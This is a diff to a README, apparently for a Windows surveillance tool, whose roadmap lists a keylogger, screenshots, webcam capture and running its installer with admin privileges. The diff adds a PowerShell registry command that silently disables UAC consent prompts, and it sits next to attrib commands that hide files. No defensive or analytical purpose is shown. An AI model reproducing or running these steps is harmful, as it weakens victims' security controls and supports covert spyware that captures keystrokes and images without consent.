@@ -36,6 +36,9 @@ attrib -h -s -r FILE
 
 # hide file
 attrib +h +s +r FILE
+
+# disable uac
+Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
 ```
 
 ## Components
@@ -63,7 +66,7 @@ attrib +h +s +r FILE
 
 ## Roadmap
 
-- initial staging
+- run installer with admin priv
 - redevelop keylogger
 - screenshots
 - webcam
